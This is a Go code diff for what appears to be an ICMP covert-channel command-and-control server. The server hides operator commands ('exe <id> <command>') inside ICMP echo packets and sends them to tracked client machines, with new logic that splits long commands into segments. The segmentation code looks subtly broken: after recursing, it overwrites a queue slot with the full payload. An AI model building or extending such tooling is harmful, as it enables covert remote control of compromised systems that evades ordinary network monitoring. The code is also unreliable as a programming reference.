@@ -117,26 +117,36 @@ func generate_header(segments int) string {
 }
 
 func generate_packet(payload string, segment int) {
-	numOfSegments := len(payload) / 1460
-	fmt.Println(numOfSegments)
-	PACKETQUEUE = make([]icmp.Message, numOfSegments+1)
-	// byteSize := len(payload)
-	// if byteSize > 1460 {
-	// 	fmt.Println("Conductor we have a problem!!!!!")
-	// 	firstPayload = payload[0:1460]
-	// 	nextPayload = payload[1460:byteSize]
-	// }
+	// Recursivly calls generate packet if too large
+	byteSize := len(payload)
+	if byteSize > 1460 {
+		fmt.Println("Conductor we have a problem!!!!!")
+		firstPayload := payload[0:1460]
+		nextPayload := payload[1460:byteSize]
+		packet := icmp.Message{
+			Type: ipv4.ICMPTypeEcho, Code: 0,
+			Body: &icmp.Echo{
+				ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
+				Data: []byte(generate_header(segment) + firstPayload),
+			},
+		}
+		fmt.Println(len(PACKETQUEUE))
+		PACKETQUEUE[segment] = packet
+		generate_packet(nextPayload, segment+1)
+	}
+
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho, Code: 0,
 		Body: &icmp.Echo{
 			ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
-			Data: []byte(payload),
+			Data: []byte(generate_header(segment) + payload),
 		},
 	}
+	fmt.Println(len(PACKETQUEUE))
 	PACKETQUEUE[segment] = packet
 }
 
-func send_packet(addr string, c icmp.PacketConn) {
+func send_packets(addr string, c icmp.PacketConn) {
 	for _, packet := range PACKETQUEUE {
 		// fmt.Println("Packet:", addr)
 		binaryEncoding, _ := packet.Marshal(nil)
@@ -236,18 +246,21 @@ func main() {
 			showclients()
 
 		} else if strings.HasPrefix(input, "exe") {
+			// Parse command
 			_, after, _ := strings.Cut(input, " ")
-			// fmt.Println(after)
 			id, command, _ := strings.Cut(after, " ")
 			command = strings.TrimRight(command, "\r\n")
-			// fmt.Println(id, command)
+
+			// Create queue for packet sending
+			PACKETQUEUE = make([]icmp.Message, (len(command)/1460)+1)
+
 			clientid := parse_id(id)
 			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 			generate_packet(command, 0)
 			if DEBUG {
 				fmt.Println("[DEBUG]", command, "sent to", clients[clientid])
 			}
-			send_packet(ipaddr, *c)
+			send_packets(ipaddr, *c)
 
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
